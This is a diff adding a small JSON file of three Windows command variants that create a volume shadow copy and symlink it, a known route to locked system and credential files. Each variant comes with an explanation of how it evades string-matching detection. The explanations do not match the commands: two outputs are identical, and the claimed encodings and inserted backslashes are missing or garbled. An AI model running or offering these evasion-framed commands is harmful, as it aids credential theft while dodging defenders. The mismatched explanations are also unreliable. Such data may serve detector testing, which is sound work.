@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c vssadmin.exe create shadow /for=C: & mklink /D C:\\Temp\\vssstore \\\\?\$\$GLOBALROOT\$\$Device\$\$HarddiskVolumeShadowCopy1",
+    "explanation": "Reordering and encoding: Replaced the suspicious string 'HarddiskVolumeShadowCopy' with encoded equivalent to bypass string matching."
+  },
+  {
+    "output": "cmd.exe /c vssadmin.exe create shadow /for=C: & mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+    "explanation": "Insertion: Added extra backslashes to alter the string representation without changing the actual target, potentially evading pattern matching."
+  },
+  {
+    "output": "cmd.exe /c vssadmin.exe create shadow /for=C: & mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+    "explanation": "Substitution: Replaced the suspicious path with a syntactically equivalent but differently structured path to avoid direct string matches."
+  }
+]
